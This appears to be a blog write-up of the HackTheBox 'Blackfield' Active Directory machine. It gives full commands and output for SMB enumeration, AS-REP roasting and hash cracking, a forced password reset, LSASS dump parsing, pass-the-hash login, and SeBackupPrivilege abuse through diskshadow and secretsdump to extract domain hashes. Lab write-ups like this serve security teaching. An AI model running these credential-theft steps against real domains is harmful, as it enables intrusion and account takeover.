---
title: "HTB: Blackfield"
date: 2025-01-25
draft: false
summary: HTB Hard Difficulty Windows Machine. AD.
tags:
  - windows
  - hard
  - active-directory
category: HTB
---
#### Box Information
- **Creator**: aas
- **Release Date**: 06 Jun, 2020
- **OS**: Windows
- **Difficulty**: Hard

This machine starts with getting a list of valid users from SMB, which is used to perform AS-REP roasting to get access to a user. This is then used to change another user's password, who has access over a share in SMB that contains the memory dump for LSASS. I extracted the hashes and gained access to a user with backup privileges, allowing the dumping of domain hashes.

#### Recon
###### Nmap scan
I started the box with a port scan using **Nmap**. Looks like this box is an active directory (AD) box as it has the DNS, Kerberos, and LDAP running. From the scan results, we can also get the domain name, which is `BLACKFIELD.local`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ sudo nmap -p- --min-rate 10000 10.10.10.192
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 13:10 WIB
Nmap scan report for 10.10.10.192
Host is up (1.1s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 24.88 seconds

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ sudo nmap -p 53,88,135,389,445,593,3268,5985 -sCV 10.10.10.192
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 13:12 WIB
Nmap scan report for 10.10.10.192
Host is up (0.60s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-25 13:12:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time:
|   date: 2025-01-25T13:13:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.98 seconds
```

###### SMB enumeration
Since there's SMB running, I decided to start the enumeration here. I start by testing for SMB null authentication and `guest` account using **netexec**. The SMB doesn't allow us to list shares as null account, but we can use `guest` account to do that. 

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ netexec smb 10.10.10.192 -u '' -p '' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ netexec smb 10.10.10.192 -u 'guest' -p '' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest:
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
```

There are two non-standard shares here, which are `forensic` and `profiles$`, and I have read access to `profiles$`. I will use **smbclient** to connect to the share and list the contents, and I found that the content of the shares are a lot of empty folders for different users in this machine. 

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ smbclient '//10.10.10.192/profiles$' -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 23:47:12 2020
  ..                                  D        0  Wed Jun  3 23:47:12 2020
  AAlleni                             D        0  Wed Jun  3 23:47:11 2020
  ABarteski                           D        0  Wed Jun  3 23:47:11 2020
  ABekesz                             D        0  Wed Jun  3 23:47:11 2020
...SNIP...
  ZMalaab                             D        0  Wed Jun  3 23:47:12 2020
  ZMiick                              D        0  Wed Jun  3 23:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 23:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 23:47:12 2020
  ZWausik                             D        0  Wed Jun  3 23:47:12 2020
                5102079 blocks of size 4096. 1693830 blocks available
smb: \>
```

We can take the name of these users and make them into a wordlist, then probably use **Kerbrute** to validate them. Found three valid usernames that we can 

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ awk '{print $1}' raw.txt > users.list

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 users.list

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/25/25 - Ronnie Flathers @ropnop

2025/01/25 13:29:28 >  Using KDC(s):
2025/01/25 13:29:28 >   10.10.10.192:88

2025/01/25 13:29:53 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2025/01/25 13:32:12 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2025/01/25 13:32:13 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2025/01/25 13:32:48 >  Done! Tested 314 usernames (3 valid) in 200.271 seconds
```

Since we can authenticate as `guest` on the SMB, I decided to do RID brute-force too to get a list of usernames. I found another user `lydericlefebvre` that doesn't appear on our results above, probably because of the username format `firstnamelastname`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ netexec smb 10.10.10.192 -u 'guest' -p '' --rid-brute
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest:
...SNIP...
SMB         10.10.10.192    445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1104: BLACKFIELD\support (SidTypeUser)
SMB         10.10.10.192    445    DC01             1413: BLACKFIELD\svc_backup (SidTypeUser)
SMB         10.10.10.192    445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
...SNIP...
```

#### Shell as svc_backup
###### AS-REP roasting
Now that we have a valid list of usernames, we can attempt to check and perform AS-REP roasting. I use **GetNPUsers.py** for this. Found the AS-REP hash for user `support`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ GetNPUsers.py BLACKFIELD.local/ -usersfile valid_users.list -dc-ip 10.10.10.192 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

/home/chronopad/.local/bin/GetNPUsers.py:163: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Let's identify the hashcat mode for the hash with **haiti**, then crack the hash using **hashcat**. Obtained the credential `support:#00^BlackKnight`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ haiti '$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a'
Kerberos 5 AS-REP etype 23 [HC: 18200] [JtR: krb5asrep]

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ echo '$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a' > support.asrep

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ hashcat -m 18200 support.asrep ~/Arsenal/wordlists/rockyou.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a:#00^BlackKnight
```

###### BloodHound enumeration
Now that we got a valid domain user credential, let's do further enumeration with **BloodHound**. I start by using Python BloodHound ingestor to collect the data.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows]
└─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d BLACKFIELD.local -c all
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -3] Temporary failure in name resolution
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 02M 06S
```

After collecting the data, we can start the neo4j database and feed the data to BloodHound. I started the analysis from the newly obtained user `support` and found that the user can change the password of another user `audit2020`.

![[Pasted image 20250125143634.png]]

Let's change the password of user `audit2020`. I do this using **net rpc** command to change the password to something easy, like `Password123`. I then verified if the change is successful using **netexec**.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound]
└─$ net rpc password 'audit2020' 'Password123' -U 'BLACKFIELD.local'/'support'%'#00^BlackKnight' -S 10.10.10.192

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound]
└─$ netexec smb 10.10.10.192 -u 'audit2020' -p 'Password123'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123
```

###### SMB enumeration
Let's check the SMB access of `audit2020`. Turns out now we have read access to the `forensic` share.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound]
└─$ netexec smb 10.10.10.192 -u 'audit2020' -p 'Password123' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

I connected to the share with **smbclient** and found an interesting file *lsass.zip*, which seems to be a memory dump of the LSASS. However, the file is too large for us to download directly as it returns this error: `parallel_read returned NT_STATUS_IO_TIMEOUT`. 

```
smb: \memory_analysis\> get lsass.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
```

I found this [forum post](https://unix.stackexchange.com/questions/31900/smbclient-alternative-for-large-files) on how to copy large files over SMB and tried some methods specified here. The method to set longer timeout works for me.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ smbclient //10.10.10.192/forensic -U audit2020 Password123
Try "help" to get a list of possible commands.
smb: \> cd memory_analysis
smb: \memory_analysis\> timeout 600; iosize 16384;
io_timeout per operation is now 600
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (183.1 KiloBytes/sec) (average 183.1 KiloBytes/sec)
smb: \memory_analysis\>
```

Unzipping *lsass.zip* gives *lsass.DMP*, which indeed is the memory dump of LSASS. We can extract credentials from this file using **pypykatz**. Found the NT hash for `svc_backup`: `9658d1d1dcd9250115e2205d9f48400d`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ pypykatz lsa minidump ./lsass.DMP
...SNIP...
== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991
...SNIP...
```

If we look for `svc_backup` on our BloodHound, we can see this user is a part of `Remote Management` and `Backup Operators` group. This means we can connect to this user using **evil-winrm**. Obtained the user flag.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

#### Shell as administrator
###### Shell enumeration
Remember that this user is a member of the `Backup Operators` group, which must mean that this user has `SeBackupPrivilege`. Let's quickly verify it.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

Since we have `SeBackupPrivilege`, we can use the privilege escalation technique specified on [this post](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/). Basically we have full read access to the system, allowing us to read sensitive files like the SAM file and SYSTEM registry file, which contains the credentials of highly privileged users that we can crack.

###### Exploiting SeBackupPrivilege
We can use **reg save** to copy the registry files *sam* and *system*, then download them using the download functionality of **evil-winrm**. Note that downloading the *system* takes a while.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\sam c:\sam.reg
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system c:\system.reg
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> download c:\sam.reg

Info: Downloading c:\sam.reg to sam.reg

Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download c:\system.reg

Info: Downloading c:\system.reg to system.reg

Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

After getting them on our local machine, we can use **secretsdump.py** from Impacket to extract the credentials.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ secretsdump.py -sam sam.reg -system system.reg LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

We successfully extracted the local Administrator's NTLM hash, however there's something missing. I treated this part like a non-domain-joined machine and extracted the local credentials from SAM instead of targeting the domain credentials. 

Now let's start targeting the domain credentials located in the *ntds.dit* file. I followed the steps specified on the same post as above. Start by creating the file below.

```
# chrono.dsh
set context persistent nowriters
add volume c: alias chrono
create
expose %chrono% z:
```

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ unix2dos chrono.dsh
unix2dos: converting file chrono.dsh to DOS format...
```

After that, I uploaded the *chrono.dsh* file and created a shadow copy of the C: drive.

```
*Evil-WinRM* PS C:\Temp> upload chrono.dsh
...SNIP...
*Evil-WinRM* PS C:\Temp> diskshadow /s chrono.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  1/25/2025 8:56:27 AM

-> set context persistent nowriters
-> add volume c: alias chrono
-> create
Alias chrono for shadow ID {9c8474c6-d67a-401e-a611-2649e7f01c8b} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {d1f65e75-d98c-4716-9e6a-c820ee4f1306} set as environment variable.

Querying all shadow copies with the shadow copy set ID {d1f65e75-d98c-4716-9e6a-c820ee4f1306}

        * Shadow copy ID = {9c8474c6-d67a-401e-a611-2649e7f01c8b}               %chrono%
                - Shadow copy set: {d1f65e75-d98c-4716-9e6a-c820ee4f1306}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 1/25/2025 8:56:28 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %chrono% z:
-> %chrono% = {9c8474c6-d67a-401e-a611-2649e7f01c8b}
The shadow copy was successfully exposed as z:\.
->
```

Now we can copy the *ntds* file to the current directory and download it.

```
*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit
...SNIP...
*Evil-WinRM* PS C:\Temp> download ntds.dit
```

I used **secretsdump.py** again to extract the hashes from *ntds.dit*. Obtained the domain `Administrator`'s hash.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ secretsdump.py -system system.reg -ntds ntds.dit local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

Successfully gained access over the `Administrator`, which marks this machine as rooted!

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files]
└─$ netexec smb 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```
